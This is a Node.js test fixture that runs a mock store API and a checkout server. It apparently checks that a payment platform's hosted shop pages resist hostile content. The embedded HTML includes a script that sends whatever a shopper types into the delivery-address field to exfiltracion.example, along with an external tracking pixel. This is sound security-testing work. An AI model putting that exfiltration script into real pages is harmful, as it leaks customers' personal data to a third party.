import { createServer } from 'node:http';
import { spawn } from 'node:child_process';

// Public API fixture: load an already-published source revision through the
// real checkout application and production HTTP server, without a database.
const snapshot = {
  schemaVersion: 1,
  brief: {},
  files: [
    { path: 'config.js', content: 'window.PAGOSYA_CONFIG = {};' },
    { path: 'index.html', content: `<!doctype html><html lang="es"><head><title>Tienda de prueba</title></head><body>
      <label>Dirección de entrega <input id="direccion"></label>
      <img id="foto-plataforma" alt="Foto de producto" src="http://127.0.0.1:4518/v1/uploads/11111111-2222-4333-8444-555555555555.png">
      <a id="instagram" href="https://instagram.com/tienda-prueba">Instagram</a>
      <a id="desconocido" href="https://desconocido.example/">Otro sitio</a>
      <img id="foto-externa" alt="Foto externa" src="https://exfiltracion.example/pixel.png">
      <iframe title="Ubicación del negocio" src="https://www.openstreetmap.org/export/embed.html?bbox=-68.2,-16.6,-68.1,-16.5"></iframe>
      <script src="config.js"></script>
      <script>document.querySelector('#direccion').addEventListener('input', event => {
        window.location.href = 'https://exfiltracion.example/?v=' + encodeURIComponent(event.target.value);
      });</script>
    </body></html>` },
  ],
};

// 1×1 PNG served from the platform upload directory, the only image source hosted designs may use.
const PIXEL = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a/1cAAAAASUVORK5CYII=', 'base64');

const api = createServer((request, response) => {
  const url = new URL(request.url, 'http://127.0.0.1:4518');
  if (url.pathname.startsWith('/v1/uploads/')) {
    response.writeHead(200, { 'Content-Type': 'image/png', 'Cross-Origin-Resource-Policy': 'cross-origin' });
    return response.end(PIXEL);
  }
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Content-Type', 'application/json');
  const body = url.pathname === '/v1/stores/public/domain'
    ? { hostname: url.searchParams.get('hostname'), slug: 'seguridad' }
    : url.pathname === '/v1/stores/public/seguridad/seo'
      ? { head: '<title>Tienda de prueba</title>', body: '<h1>Tienda de prueba</h1>' }
      : url.pathname === '/v1/stores/public/seguridad/store'
        ? { storeId: 'store_seguridad', storeName: 'Tienda de prueba', publishedSourceRevision: 1, items: [], categories: [], collections: [], links: [{ id: 'l1', label: 'Instagram', url: 'https://instagram.com/tienda-prueba' }] }
        : url.pathname === '/v1/stores/public/seguridad/verification'
          ? { storeName: 'Tienda de prueba', slug: 'seguridad', verifiedBusiness: true, verifiedSince: '2026-08-02', electronicInvoicing: true, securePayments: true, onPlatformSince: '2026-07-01', reviews: { count: 3, average: 4.7 }, officialDomain: null }
        : url.pathname === '/v1/stores/public/seguridad/source-site'
          ? { published: true, snapshot }
          : null;
  response.statusCode = body ? 200 : 404;
  response.end(JSON.stringify(body || { message: 'No disponible.' }));
});

api.listen(4518, '127.0.0.1', () => {
  const checkout = spawn(process.execPath, ['apps/checkout/server.mjs'], {
    stdio: 'inherit',
    env: { ...process.env, PORT: '4517', HOST: '127.0.0.1', CHECKOUT_ORIGIN: 'http://127.0.0.1:4517', INTERNAL_API_BASE_URL: 'http://127.0.0.1:4518/v1' },
  });
  for (const signal of ['SIGINT', 'SIGTERM']) process.on(signal, () => {
    checkout.kill(signal);
    api.close();
  });
  checkout.on('exit', code => { api.close(); process.exitCode = code || 0; });
});
